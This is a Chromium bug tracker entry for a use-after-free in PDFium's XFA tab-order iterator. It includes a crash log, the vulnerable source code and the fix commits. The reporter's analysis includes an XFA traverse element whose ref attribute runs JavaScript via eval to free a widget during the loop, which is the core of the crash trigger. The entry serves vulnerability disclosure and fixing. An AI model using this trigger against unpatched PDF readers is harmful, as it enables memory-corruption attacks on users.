# Security: PDFium (XFA) Use-after-free in CXFA_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray

| Field | Value |
|-------|-------|
| **Issue ID** | [40095552](https://issues.chromium.org/issues/40095552) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2019-07-01 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free in CXFA\_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe  

Click to edit box and press `Tab` key to trigger crash

CRASH INFORMATION

(27c8.2418): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\pdfium.dll  

eax=3e98efe8 ebx=00000000 ecx=3e98efe8 edx=0a300000 esi=13cc4fd8 edi=00000001  

eip=776dc0da esp=012fd4c8 ebp=012fd4cc iopl=0 nv up ei pl nz na pe nc  

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206  

pdfium!fxcrt::UnownedPtr::Get+0xa:  

776dc0da 8b00 mov eax,dword ptr [eax] ds:002b:3e98efe8=????????

3:025> kp

# ChildEBP RetAddr

00 012fd4cc 776d9454 pdfium!fxcrt::UnownedPtr<CXFA\_Node>::Get(void)+0xa [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\core\fxcrt\unowned\_ptr.h @ 91]  

01 012fd4d8 7788fa81 pdfium!CXFA\_FFWidget::GetNode(void)+0x14 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\xfa\fxfa\cxfa\_ffwidget.h @ 130]  

02 012fd560 7788f916 pdfium!CXFA\_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray(void)+0xe1 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\xfa\fxfa\cxfa\_ffpageview.cpp @ 352]  

03 012fd570 7788f8b6 pdfium!CXFA\_FFTabOrderPageWidgetIterator::Reset(void)+0x16 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\xfa\fxfa\cxfa\_ffpageview.cpp @ 247]  

04 012fd5a0 7788e6dc pdfium!CXFA\_FFTabOrderPageWidgetIterator::CXFA\_FFTabOrderPageWidgetIterator(class CXFA\_FFPageView \* pPageView = 0x471c6ff0, unsigned int dwFilter = 0x188)+0xa6 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\xfa\fxfa\cxfa\_ffpageview.cpp @ 241]  

05 012fd5d4 7788e5e2 pdfium!pdfium::MakeUnique<CXFA\_FFTabOrderPageWidgetIterator,CXFA\_FFPageView \*,unsigned int &>(class CXFA\_FFPageView \*\* args = 0x012fd610, unsigned int \* args = 0x012fd638)+0x5c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\third\_party\base\ptr\_util.h @ 56]  

06 012fd628 776b6269 pdfium!CXFA\_FFPageView::CreateWidgetIterator(unsigned int dwTraverseWay = 1, unsigned int dwWidgetFilter = 0x188)+0x72 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\xfa\fxfa\cxfa\_ffpageview.cpp @ 137]  

07 012fd6ac 776b6107 pdfium!CPDFSDK\_AnnotHandlerMgr::GetNextAnnot(class CPDFSDK\_Annot \* pSDKAnnot = 0x46ca4fe0, bool bNext = true)+0x79 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\cpdfsdk\_annothandlermgr.cpp @ 317]  

08 012fd708 776d72f1 pdfium!CPDFSDK\_AnnotHandlerMgr::Annot\_OnKeyDown(class CPDFSDK\_Annot \* pAnnot = 0x46ca4fe0, int nKeyCode = 0n9, int nFlag = 0n1024)+0xe7 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\cpdfsdk\_annothandlermgr.cpp @ 236]  

09 012fd73c 776fbf31 pdfium!CPDFSDK\_PageView::OnKeyDown(int nKeyCode = 0n9, int nFlag = 0n1024)+0x61 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\cpdfsdk\_pageview.cpp @ 482]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\chrome.dll  

0a 012fd770 1ab3de18 pdfium!FORM\_OnKeyDown(struct fpdf\_form\_handle\_t\_\_ \* hHandle = 0x40d28fb8, struct fpdf\_page\_t\_\_ \* page = 0x40c4afe8, int nKeyCode = 0n9, int modifier = 0n1024)+0x61 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\fpdf\_formfill.cpp @ 479]  

0b 012fd828 1ab3cd99 chrome!chrome\_pdf::PDFiumEngine::OnKeyDown(class pp::KeyboardInputEvent \* event = 0x012fd95c)+0xb8 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\pdf\pdfium\pdfium\_engine.cc @ 1662]  

0c 012fda30 1ab60f1d chrome!chrome\_pdf::PDFiumEngine::HandleEvent(class pp::InputEvent \* event = 0x012fdba0)+0x249 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\pdf\pdfium\pdfium\_engine.cc @ 962]  

0d 012fdbb4 192febf6 chrome!chrome\_pdf::OutOfProcessInstance::HandleInputEvent(class pp::InputEvent \* event = 0x012fdbe4)+0x60d [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\pdf\out\_of\_process\_instance.cc @ 846]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\ppapi\_proxy.dll  

0e 012fdbf4 507fa767 chrome!pp::InputEvent\_HandleEvent(int pp\_instance = 0n-1840445075, int resource = 0n350)+0x96 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\cpp\module.cc @ 53]  

0f 012fdc24 507fa6fa ppapi\_proxy!ppapi::CallWhileUnlocked<PP\_Bool,int,int,int,int>(<function> \* function = 0x192feb60, int \* p1 = 0x012fdc78, int \* p2 = 0x012fdc5c)+0x47 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\shared\_impl\proxy\_lock.h @ 136]  

10 012fdc70 507fb09e ppapi\_proxy!ppapi::proxy::PPP\_InputEvent\_Proxy::OnMsgHandleFilteredInputEvent(int instance = 0n-1840445075, struct ppapi::InputEventData \* data = 0x012fde48, <unnamed-tag> \* result = 0x012fdd98)+0xaa [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\ppp\_input\_event\_proxy.cc @ 107]  

11 012fdcb4 507fafc8 ppapi\_proxy!base::DispatchToMethodImpl<ppapi::proxy::PPP\_InputEvent\_Proxy \*,void (class ppapi::proxy::PPP\_InputEvent\_Proxy \*\* obj = 0x012fdf1c, <function> \* method = 0x507fa650, class std::\_\_1::tuple<int,ppapi::InputEventData> \* in = 0x012fde40, class std::\_\_1::tuple<PP\_Bool> \* out = 0x012fdd98)+0x8e [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\tuple.h @ 96]  

12 012fdd18 507fa5bc ppapi\_proxy!base::DispatchToMethod<ppapi::proxy::PPP\_InputEvent\_Proxy \*,void (class ppapi::proxy::PPP\_InputEvent\_Proxy \*\* obj = 0x012fdf1c, <function> \* method = 0x507fa650, class std::\_\_1::tuple<int,ppapi::InputEventData> \* in = 0x012fde40, class std::\_\_1::tuple<PP\_Bool> \* out = 0x012fdd98)+0x98 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\tuple.h @ 105]  

13 012fdf10 507f9f8d ppapi\_proxy!IPC::MessageT<PpapiMsg\_PPPInputEvent\_HandleFilteredInputEvent\_Meta,std::\_\_1::tuple<int,ppapi::InputEventData>,std::\_\_1::tuple<PP\_Bool> >::Dispatch<ppapi::proxy::PPP\_InputEvent\_Proxy,ppapi::proxy::PPP\_InputEvent\_Proxy,void,void (class IPC::Message \* \*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\message\_support.dll  

msg = 0x168c0fb8 {size = 0x90}, class ppapi::proxy::PPP\_InputEvent\_Proxy \* obj = 0x418c8fe8, class ppapi::proxy::PPP\_InputEvent\_Proxy \* sender = 0x418c8fe8, <function> \* func = 0x507fa650)+0x2cc [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ipc\ipc\_message\_templates.h @ 205]  

14 012fdf88 507397a7 ppapi\_proxy!ppapi::proxy::PPP\_InputEvent\_Proxy::OnMessageReceived(class IPC::Message \* msg = 0x168c0fb8 {size = 0x90})+0x14d [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\ppp\_input\_event\_proxy.cc @ 85]  

15 012fe064 50795c75 ppapi\_proxy!ppapi::proxy::Dispatcher::OnMessageReceived(class IPC::Message \* msg = 0x168c0fb8 {size = 0x90})+0x127 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\dispatcher.cc @ 70]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\ipc.dll  

16 012fe138 633288df ppapi\_proxy!ppapi::proxy::PluginDispatcher::OnMessageReceived(class IPC::Message \* msg = 0x168c0fb8 {size = 0x90})+0x2f5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\plugin\_dispatcher.cc @ 273]  

17 012fe158 6332ebff ipc!IPC::ChannelProxy::Context::OnDispatchMessage(class IPC::Message \* message = 0x168c0fb8 {size = 0x90})+0x8f [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ipc\ipc\_channel\_proxy.cc @ 326]  

18 012fe180 6332eadc ipc!base::internal::FunctorTraits<void (<function> \* method = 0x63328850, class scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);) \* receiver\_ptr = 0x168c0fb0 [0x63381340] 0x42df4f10 {...}, class IPC::Message \* args = 0x168c0fb8 {size = 0x90})+0x4f [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 499]  

19 012fe1c0 6332ea0f ipc!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x168c0fa8, class scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);) \* args = 0x168c0fb0 [0x63381340] 0x42df4f10 {...}, class IPC::Message \* args = 0x168c0fb8 {size = 0x90})+0x7c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 599]  

1a 012fe1e4 6332e8c4 ipc!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x168c0fa8, class std::**1::tuple<scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);),IPC::Message> \* bound = 0x168c0fb0)+0x6f [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 672]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\base.dll  

1b 012fe20c 68311bb0 ipc!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x168c0f90)+0x54 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 641]  

1c 012fe230 684e7d73 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\callback.h @ 98]  

1d 012fe4b8 6853d457 base!base::TaskAnnotator::RunTask(char \* trace\_event\_name = 0x686ca607 "ThreadController::Task", struct base::PendingTask \* pending\_task = 0x012fe800)+0x5b3 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\common\task\_annotator.cc @ 144]  

1e 012fe870 6853ca81 base!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence\_manager::LazyNow \* continuation\_lazy\_now = 0x012fe910, bool \* ran\_task = 0x012fe92b)+0x737 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc @ 368]  

1f 012fe938 683d1ea0 base!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void)+0xb1 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc @ 218]  

20 012fe998 6853e85c base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x3f274f2c)+0x60 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\message\_loop\message\_pump\_default.cc @ 39]  

21 012fec2c 68479d6b base!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application\_tasks\_allowed = true, class base::TimeDelta timeout = 9223372036854775807)+0x34c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc @ 466]  

22 012feee0 68479a05 base!base::RunLoop::RunWithTimeout(class base::TimeDelta timeout = 9223372036854775807)+0x34b [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\run\_loop.cc @ 163]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\content.dll  

23 012fef08 1f4b7315 base!base::RunLoop::Run(void)+0x45 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\run\_loop.cc @ 131]  

24 012ff0f0 232afc26 content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x012ff164)+0x5c5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\ppapi\_plugin\ppapi\_plugin\_main.cc @ 160]  

25 012ff11c 232b0c75 content!content::RunOtherNamedProcessTypeMain(class std::1::basic\_string<char,std::1::char\_traits<char>,std::1::allocator<char> > \* process\_type = 0x012ff180 "ppapi", struct content::MainFunctionParams \* main\_function\_params = 0x012ff164, class content::ContentMainDelegate \* delegate = 0x012ff750)+0xa6 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_main\_runner\_impl.cc @ 579]  

26 012ff2d8 232ac500 content!content::ContentMainRunnerImpl::Run(bool start\_service\_manager\_only = false)+0x2c5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_main\_runner\_impl.cc @ 876]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\embedder.dll  

27 012ff2f0 35d422e1 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x30 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_service\_manager\_main\_delegate.cc @ 52]  

28 012ff670 232afa4c embedder!service\_manager::Main(struct service\_manager::MainParams \* params = 0x012ff694)+0x6d1 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\services\service\_manager\embedder\main.cc @ 422]  

29 012ff6bc 16cf1315 content!content::ContentMain(struct content::ContentMainParams \* params = 0x012ff734)+0x5c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_main.cc @ 20]  

\*\*\* WARNING: Unable to verify checksum for chrome.exe  

2a 012ff798 003a8e33 chrome!ChromeMain(struct HINSTANCE \* instance = 0x003a0000, struct sandbox::SandboxInterfaceInfo \* sandbox\_info = 0x012ff82c, int64 exe\_entry\_point\_ticks = 0n52685952910)+0x1f5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\chrome\app\chrome\_main.cc @ 110]  

2b 012ff890 003a1479 chrome\_exe!MainDllLoader::Launch(struct HINSTANCE \* instance = 0x003a0000, class base::TimeTicks exe\_entry\_point\_ticks = class base::TimeTicks)+0x453 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\chrome\app\main\_dll\_loader\_win.cc @ 202]  

2c 012ffb74 005ddd8e chrome\_exe!wWinMain(struct HINSTANCE \* instance = 0x003a0000, struct HINSTANCE** \* prev = 0x00000000)+0x479 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\chrome\app\chrome\_exe\_main\_win.cc @ 229]  

2d 012ffb8c 005ddee1 chrome\_exe!invoke\_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl @ 123]  

2e 012ffbe4 005ddfad chrome\_exe!\_\_scrt\_common\_main\_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl @ 283]  

2f 012ffbec 005ddfb8 chrome\_exe!\_\_scrt\_common\_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl @ 326]  

30 012ffbf4 75f80419 chrome\_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe\_wwinmain.cpp @ 17]  

31 012ffc04 7706662d KERNEL32!BaseThreadInitThunk+0x19  

32 012ffc60 770665fd ntdll!\_\_RtlUserThreadStart+0x2f  

33 012ffc70 00000000 ntdll!\_RtlUserThreadStart+0x1b

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 9.5 KB)
- [crash_info.txt](attachments/crash_info.txt) (text/plain, 19.4 KB)

## Timeline

### cl...@chromium.org (2019-07-01)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5698181682036736.

### cl...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-07-01)

Testcase 5698181682036736 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5698181682036736.

### jd...@chromium.org (2019-07-01)

tsepez@: You're a lot better equipped to judge these than I am. Can you take a look at this and re-route if needed? Thanks a ton.

[Monorail components: Internals>Plugins>PDF]

### jd...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-07-12)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-08-22)

[Empty comment from Monorail migration]

### hu...@gmail.com (2020-01-17)

Hi all, 

Is there any update for this issue guys? I just checked again and the program is still crashed by poc at the same place :D


### hu...@gmail.com (2020-01-20)

Hi guys, 

Here is my detail description about this bug. Hope this can give you more information to fix it. 

===================================================================================================

Detail vulnerability 

The bug is in function `CXFA_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray()`

```
void CXFA_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray() {
  m_TabOrderWidgetArray.clear();

  std::vector<CXFA_FFWidget*> SpaceOrderWidgetArray;
  CreateSpaceOrderWidgetArray(&SpaceOrderWidgetArray);
  if (SpaceOrderWidgetArray.empty())
    return;

  int32_t nWidgetCount = pdfium::CollectionSize<int32_t>(SpaceOrderWidgetArray);
  CXFA_FFWidget* hWidget = SpaceOrderWidgetArray[0];
  while (pdfium::CollectionSize<int32_t>(m_TabOrderWidgetArray) <
         nWidgetCount) {
    if (!pdfium::ContainsValue(m_TabOrderWidgetArray, hWidget)) {
      m_TabOrderWidgetArray.emplace_back(hWidget);
      CXFA_Node* pNode = hWidget->GetNode();
      if (pNode->GetFFWidgetType() == XFA_FFWidgetType::kExclGroup) {
        auto it = std::find(SpaceOrderWidgetArray.begin(),
                            SpaceOrderWidgetArray.end(), hWidget);
        int32_t iWidgetIndex = it != SpaceOrderWidgetArray.end()
                                   ? it - SpaceOrderWidgetArray.begin() + 1
                                   : 0;
        while (true) {
          CXFA_FFWidget* radio =
              SpaceOrderWidgetArray[iWidgetIndex % nWidgetCount];
          if (radio->GetNode()->GetExclGroupIfExists() != pNode)
            break;
          if (!pdfium::ContainsValue(m_TabOrderWidgetArray, hWidget))
            m_TabOrderWidgetArray.emplace_back(radio);

          iWidgetIndex++;
        }
      }
      if (CXFA_FFWidget* hTraverseWidget = GetTraverseWidget(hWidget)) {
        hWidget = hTraverseWidget;
        continue;
      }
    }
    auto it = std::find(SpaceOrderWidgetArray.begin(),
                        SpaceOrderWidgetArray.end(), hWidget);
    int32_t iWidgetIndex = it != SpaceOrderWidgetArray.end()
                               ? it - SpaceOrderWidgetArray.begin() + 1
                               : 0;
    hWidget = SpaceOrderWidgetArray[iWidgetIndex % nWidgetCount];
  }
}
```
First, this function creates an array of `CXFA_FFWidget` object and stores in array `SpaceOrderWidgetArray`
```
  std::vector<CXFA_FFWidget*> SpaceOrderWidgetArray;
  CreateSpaceOrderWidgetArray(&SpaceOrderWidgetArray);
  if (SpaceOrderWidgetArray.empty())
    return;

  int32_t nWidgetCount = pdfium::CollectionSize<int32_t>(SpaceOrderWidgetArray);
  CXFA_FFWidget* hWidget = SpaceOrderWidgetArray[0];
```

After that is an while loop to loop over `CXFA_FFWidget` object in this array. The program crashs when it tries to use 
`hWidget` object again in while loop. The object is freed in JS callback handler triggerd by function call `GetTraverseWidget`
in previous loop. Next we'll see how to trigger JS callback by function `GetTraverseWidget`

Trigger JS callback 

The callback is trigger by function `GetTraverseWidget`. Let's go inside this function   
```
CXFA_FFWidget* CXFA_FFTabOrderPageWidgetIterator::GetTraverseWidget(
    CXFA_FFWidget* pWidget) {
  CXFA_Traversal* pTraversal = pWidget->GetNode()->GetChild<CXFA_Traversal>(
      0, XFA_Element::Traversal, false);
  if (pTraversal) {
    CXFA_Traverse* pTraverse =
        pTraversal->GetChild<CXFA_Traverse>(0, XFA_Element::Traverse, false);
    if (pTraverse) {
      Optional<WideString> traverseWidgetName =
          pTraverse->JSObject()->TryAttribute(XFA_Attribute::Ref, true);
      if (traverseWidgetName)
        return FindWidgetByName(*traverseWidgetName, pWidget);
    }
  }
  return nullptr;
}
```

This function calls to `FindWidgetByName` -> next to `CXFA_FFDocView::GetWidgetByName` -> `CFXJSE_Engine::ResolveObjects`
Base on https://crbug.com/chromium/980161, we know that we can trigger JS callback with function `CFXJSE_Engine::ResolveObjects`. We know 
that content of JS callback script is embedded in string `wsExpression` parameter of function `CFXJSE_Engine::ResolveObjects`.
Trace back to function `FindWidgetByName` we see that the string is get from this source code section
```
      Optional<WideString> traverseWidgetName =
          pTraverse->JSObject()->TryAttribute(XFA_Attribute::Ref, true);
      if (traverseWidgetName)
        return FindWidgetByName(*traverseWidgetName, pWidget);
```
   
This string is get from `ref` attribute of `traverse` element. So to trigger callback, we will setup a `subform` with
`traversal` element like this
```
  </subform>
    <traversal>
        <traverse operation="first" ref="$xfa.(eval('try { if (aaaa == 1) {xfa.host.setFocus(field_DropDownList1);xfa.template.remerge();xfa.host.openList(field_DropDownList1);} } catch(e){xfa.host.beep(2);}') == 0)"/> 
    </traversal>
    <event activity="docReady">
      <script contentType="application/x-javascript">
        aaaa = 1;
        sub2 = xfa.resolveNode("xfa.form..subform2");
        field_DropDownList1 = xfa.resolveNode("xfa.form..DropDownList1");
        field_DropDownList2 = xfa.resolveNode("xfa.form..DropDownList2");
        xfa.host.setFocus(field_DropDownList2);
      </script>
    </event>
  </subform>
``` 

Cause content of `ref` attribute is executed like a JS expression, to execute full JS script, we use `eval` and pass
JS script as a parameter of `eval` function. This leads to a very strange `traverse` like
```
<traverse operation="first" ref="$xfa.(eval('try { if (aaaa == 1) {xfa.host.setFocus(field_DropDownList1);xfa.template.remerge();xfa.host.openList(field_DropDownList1);} } catch(e){xfa.host.beep(2);}') == 0)"/> 
```

This script will be execute in the middle of `while` loop in function `CXFA_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray()`
and this leads to UAF bug!


### hu...@gmail.com (2020-05-29)

Hi guys, tsepez@, thestig@ 

May I ask there is any update for this issue, plz? 

### th...@chromium.org (2020-06-02)

Sorry for being slow here. Fix uploaded: https://pdfium-review.googlesource.com/70213

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-02)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/634973155ab5f27f443c38292efca94647bff5f9

commit 634973155ab5f27f443c38292efca94647bff5f9
Author: Lei Zhang <thestig@chromium.org>
Date: Tue Jun 02 01:09:29 2020

Use more RetainPtrs in CXFA_FFTabOrderPageWidgetIterator.

- Make CreateSpaceOrderLayoutItems() return a vector of
  RetainPtr<CXFA_ContentLayoutItem> instead of CXFA_FFWidget pointers.
- Change CreateTabOrderWidgetArray() to use the RetainPtrs.
- Add a test for this case.

Bug: chromium:980116
Change-Id: I5ef172930e775a07fb37e2dffe2318ead76961cb
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/70213
Commit-Queue: Lei Zhang <thestig@chromium.org>
Reviewed-by: Tom Sepez <tsepez@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/634973155ab5f27f443c38292efca94647bff5f9/xfa/fxfa/cxfa_ffpageview.h
[add] https://pdfium.googlesource.com/pdfium/+/634973155ab5f27f443c38292efca94647bff5f9/testing/resources/javascript/xfa_specific/bug_980116.in
[modify] https://pdfium.googlesource.com/pdfium/+/634973155ab5f27f443c38292efca94647bff5f9/xfa/fxfa/cxfa_ffpageview.cpp
[add] https://pdfium.googlesource.com/pdfium/+/634973155ab5f27f443c38292efca94647bff5f9/testing/resources/javascript/xfa_specific/bug_980116.evt


### th...@chromium.org (2020-06-02)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f1f98eec2c1b3650c99f4992f076e1135a39a9e1

commit f1f98eec2c1b3650c99f4992f076e1135a39a9e1
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Jun 02 03:15:10 2020

Roll PDFium from f32ae562fe52 to 634973155ab5 (13 revisions)

https://pdfium.googlesource.com/pdfium.git/+log/f32ae562fe52..634973155ab5

2020-06-02 thestig@chromium.org Use more RetainPtrs in CXFA_FFTabOrderPageWidgetIterator.
2020-06-02 thestig@chromium.org Clean up CXFA_FFTabOrderPageWidgetIterator.
2020-06-02 thestig@chromium.org Fix an UnownedPtr error in CXFA_FFTabOrderPageWidgetIterator.
2020-06-02 thestig@chromium.org Mass rewrite dtors to use "= default".
2020-06-02 thestig@chromium.org Remove unused CXFA_FFPageWidgetIterator members.
2020-06-02 thestig@chromium.org Remove DeviceType::kUnknown.
2020-06-01 nigi@chromium.org Update comments and add an embeddertest for FPDF_LCD_TEXT.
2020-06-01 thestig@chromium.org Mark CFX_RenderDevice::SetDeviceDriver() as protected.
2020-06-01 thestig@chromium.org Mark CFX_RenderDevice ctor as protected.
2020-06-01 thestig@chromium.org Make CPDFXFA_Page annot iteration methods more consistent.
2020-06-01 pdfium-autoroll@skia-public.iam.gserviceaccount.com Roll Code Coverage from a8f20a1dacc2 to a70177d4a2e5 (3 revisions)
2020-06-01 pdfium-autoroll@skia-public.iam.gserviceaccount.com Roll Catapult from 31b81b84c957 to 91fa1462a88f (119 revisions)
2020-05-29 nigi@chromium.org Remove repetitive |FXTEXT_CLEARTYPE| usages in fxbarcode/oned/.

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/pdfium-autoroll
Please CC pdfium-deps-rolls@chromium.org on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/master/autoroll/README.md

Bug: chromium:980116,chromium:980161
Tbr: pdfium-deps-rolls@chromium.org
Change-Id: Ie371134e4b5618bb5dbef9d2fd0ae33d76e4bae6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2226041
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#773986}

[modify] https://crrev.com/f1f98eec2c1b3650c99f4992f076e1135a39a9e1/DEPS


### [Deleted User] (2020-06-02)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-08)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-11)

*** Boilerplate reminders! ***
